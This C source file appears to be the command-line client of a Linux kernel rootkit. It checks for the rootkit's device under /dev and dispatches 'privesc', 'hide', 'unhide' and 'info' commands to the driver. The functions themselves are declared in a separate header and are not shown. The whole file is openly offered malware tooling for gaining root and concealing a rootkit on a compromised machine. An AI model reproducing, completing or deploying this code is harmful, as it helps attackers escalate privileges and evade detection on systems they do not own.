#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>

#include "../include/debug.h"
#include "../include/config.h"

#include "include/commands.h"

int check_driver(char *driver)
{
    int fd = open(driver, O_RDONLY);

    if (fd == -1)
    {
        CLIENT_DEBUG("Driver not found\n");
        return -1;
    }

    CLIENT_DEBUG("Driver found\n");
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        display_help(argv[0]);
        exit(-1);
    }

    size_t driver_length = strlen("/dev/") + strlen(RK_DRIVER) + 1;
    char *driver = malloc(driver_length);

    if (driver == NULL)
    {
        printf("Failed to allocate memory for the driver string\n");
        exit(-1);
    }

    snprintf(driver, driver_length, "/dev/%s", RK_DRIVER);

    if (check_driver(driver) < 0)
    {
        printf("Rootkit driver not found\n");
        exit(-1);
    }

    int ret = 0;

    char *operation = argv[1];

    CLIENT_DEBUG("[+] Operation : %s\n", operation);

    if (strcmp(operation, "privesc") == 0)
    {
        CLIENT_DEBUG("[+] Running the privesc\n");
        ret = privesc(driver);
    }

    else if (strcmp(operation, "info") == 0)
    {
        CLIENT_DEBUG("[+] Running the show_info\n");
        show_info();
    }

    else if (strcmp(operation, "unhide") == 0)
    {
        CLIENT_DEBUG("[+] Running the unhide\n");
        ret = unhide(driver);
    }

    else if (strcmp(operation, "hide") == 0)
    {
        CLIENT_DEBUG("[+] Running the hide\n");
        ret = hide(driver);
    }

    else if (
        (strcmp(operation, "-h") == 0) || 
        (strcmp(operation, "help") == 0)
    ) {
        CLIENT_DEBUG("[+] Running the display_help\n");
        display_help(driver);
    }

    else
    {
        printf("Unknown argument : %s\n", operation);
        display_help(driver);
    }

    free(driver);

    if (ret < 0)
    {
        printf("Failed to run command\n");
        return ret;
    }

    return 0;
}